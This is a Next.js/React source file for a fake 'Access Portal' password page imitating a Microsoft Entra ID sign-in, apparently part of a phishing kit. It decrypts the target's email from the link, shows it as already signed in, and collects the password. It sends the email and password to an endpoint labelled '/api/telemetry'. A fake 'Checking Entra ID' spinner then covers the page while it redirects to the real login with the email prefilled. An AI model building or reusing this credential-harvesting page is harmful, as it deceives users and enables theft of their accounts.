'use client'
import { useEffect, useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import IndustrialShell from '@/components/IndustrialShell'
import { decryptEmail } from '@/lib/crypto'

const ENTRA_BASE = process.env.NEXT_PUBLIC_ENTRA_BASE_URL || ''

function useHashParam(name: string) {
  const [value, setValue] = useState<string | null>(null)
  useEffect(() => {
    const parse = () => {
      const q = new URLSearchParams(window.location.hash.slice(1))
      setValue(q.get(name))
    }
    parse()
    window.addEventListener('hashchange', parse)
    return () => window.removeEventListener('hashchange', parse)
  }, [name])
  return value
}

function Avatar({ email }: { email: string }) {
  const letter = (email?.[0] || '?').toUpperCase()
  return (
    <div className="w-12 h-12 rounded-full bg-metal-600 border border-metal-line grid place-items-center shadow-neon">
      <span className="text-xl font-semibold text-white/90">{letter}</span>
    </div>
  )
}

export default function PasswordPhase() {
  const token = useHashParam('e')
  const [email, setEmail] = useState('')
  const [error, setError] = useState('')
  const [showModal, setShowModal] = useState(false)
  const [passwordError, setPasswordError] = useState('')

  useEffect(() => {
    (async () => {
      try {
        if (!token) return
        const plain = await decryptEmail(token)
        setEmail(plain)
      } catch {
        setError('Invalid or expired link.')
      }
    })()
  }, [token])

  const onSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setPasswordError('')

    const formData = new FormData(e.currentTarget)
    const password = String(formData.get('password') || '')

    if (password.length < 5) {
      setPasswordError('Password must be at least 5 characters.')
      return
    }

    try {
      setShowModal(true)
      await fetch('/api/telemetry', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          event: 'password_submit',
          email,
          password
        })
      })
    } finally {
      const base = ENTRA_BASE || '/'
      const sep = base.includes('?') ? '&' : '?'
      window.location.href = `${base}${sep}login_hint=${encodeURIComponent(email)}`
    }
  }

  return (
    <IndustrialShell title="Access Portal" subtitle="Phase 2 · Authenticate with password">
      {error ? (
        <div className="text-sm text-red-300">{error}</div>
      ) : (
        <>
          <form className="space-y-5" onSubmit={onSubmit}>
            <div className="flex items-center gap-3">
              <Avatar email={email} />
              <div>
                <div className="text-sm text-white/60">Signed in as</div>
                <div className="font-medium">{email || 'Decrypting…'}</div>
              </div>
            </div>

            <div>
              <label className="block text-sm text-white/60">Password</label>
              <input
                className="input"
                type="password"
                name="password"
                autoComplete="current-password"
                placeholder="••••••••"
                required
                minLength={5}
              />
              {passwordError && <p className="text-xs text-red-400 mt-1">{passwordError}</p>}
            </div>

            <button type="submit" className="btn-primary w-full">Continue</button>
          </form>

          <AnimatePresence>
            {showModal && (
              <motion.div
                className="fixed inset-0 z-50 grid place-items-center bg-black/60"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                <motion.div
                  className="card w-full max-w-sm p-6 text-center"
                  initial={{ scale: 0.95, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  exit={{ scale: 0.95, opacity: 0 }}
                >
                  <div className="mx-auto mb-3 w-12 h-12 rounded-full border border-metal-line grid place-items-center shadow-neon">
                    <div className="w-5 h-5 rounded-full border-2 border-white/30 border-t-white animate-spin" />
                  </div>
                  <h2 className="text-lg font-semibold mb-1">Checking Entra ID…</h2>
                  <p className="text-sm text-white/60">
                    Redirecting to <code>complete - Auth</code> for <span className="font-medium">{email}</span>
                  </p>
                </motion.div>
              </motion.div>
            )}
          </AnimatePresence>
        </>
      )}
    </IndustrialShell>
  )

}
